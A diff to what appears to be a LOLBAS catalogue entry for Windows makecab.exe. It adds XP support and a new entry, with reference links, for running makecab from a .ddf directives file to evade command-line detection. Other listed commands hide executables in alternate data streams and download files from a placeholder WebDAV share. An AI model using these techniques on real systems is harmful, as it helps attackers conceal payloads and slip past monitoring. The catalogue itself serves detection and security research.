@@ -1,7 +1,7 @@
 ---
 Name: Makecab.exe
 Description: Binary to package existing files into a cabinet (.cab) file
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
   - Command: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
@@ -10,7 +10,7 @@ Commands:
     Category: ADS
     Privileges: User
     MitreID: T1564.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
   - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
@@ -19,7 +19,7 @@ Commands:
     Category: ADS
     Privileges: User
     MitreID: T1564.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
   - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
@@ -28,7 +28,16 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Type: Compression
+  - Command: makecab /F directives.ddf
+    Description: Execute makecab commands as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.
+    Usecase: Bypass command-line based detections
+    Category: Execute
+    Privileges: User
+    MitreID: T1036
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
 Full_Path:
@@ -41,6 +50,9 @@ Detection:
   - IOC: Makecab storing data into alternate data streams
 Resources:
   - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
+  - Link: https://ss64.com/nt/makecab-directives.html
+  - Link: https://www.pearsonhighered.com/assets/samplechapter/0/7/8/9/0789728583.pdf
+  - Link: https://learn.microsoft.com/en-us/previous-versions/bb417343(v=msdn.10)#makecab-application
 Acknowledgement:
   - Person: Oddvar Moe
     Handle: '@oddvarmoe'
